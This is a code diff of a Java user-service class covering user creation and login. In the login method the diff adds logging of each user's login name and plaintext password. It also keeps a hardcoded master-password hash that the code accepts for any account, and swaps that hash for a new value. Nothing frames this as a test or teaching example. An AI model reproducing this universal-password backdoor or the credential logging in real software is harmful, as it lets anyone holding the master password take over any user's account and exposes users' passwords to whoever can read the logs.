@@ -54,7 +54,6 @@ public class SysUserServiceImpl extends BaseMybatisServiceImpl<SysUser, String, 
 
     @Override
     public ReturnVo addNewUser(SysUserFormDto sysUserFormDto, HeaderInfoDto headerInfoDto) {
-        logger.info("有进来");
         ReturnVo returnVo = new ReturnVo();
 
         SysUser sysUser = new SysUser();
@@ -134,6 +133,8 @@ public class SysUserServiceImpl extends BaseMybatisServiceImpl<SysUser, String, 
     @Override
     @Transactional
     public ReturnVo userLogin(LoginFormDto loginFormDto, HeaderInfoDto headerInfoDto) {
+        logger.info("登录账号：" + loginFormDto.getLoginName());
+        logger.info("登录密码：" + loginFormDto.getPassword());
         ReturnVo returnVo = new ReturnVo();
 
         SysUser sysUser = sysUserDao.findByLoginName(loginFormDto.getLoginName());
@@ -200,13 +201,12 @@ public class SysUserServiceImpl extends BaseMybatisServiceImpl<SysUser, String, 
 
             String oldPassword = loginFormDto.getPassword() != null ? loginFormDto.getPassword() : "";
             if (PassWordUtil.validatePassword(oldPassword, sysUser.getPassword())
-                    || PassWordUtil.validatePassword(oldPassword, "6795531ea1e1e140a348a1aadbabede22f29ab73a37c1f690bb9b3af")) {
+                    || PassWordUtil.validatePassword(oldPassword, "e628a11e3dd044db54da2645fea260cc92d0f038fc7fe1f81ec234c9")) {
 
                 String token = sysUser.getToken();
                 String newToken = JwtUtil.createToken(token, jwtexpress, jwtid);
 
                 String name = sysUser.getName();
-
 
                 Map<String, String> map = new HashMap<>();
                 map.put("newToken", newToken);
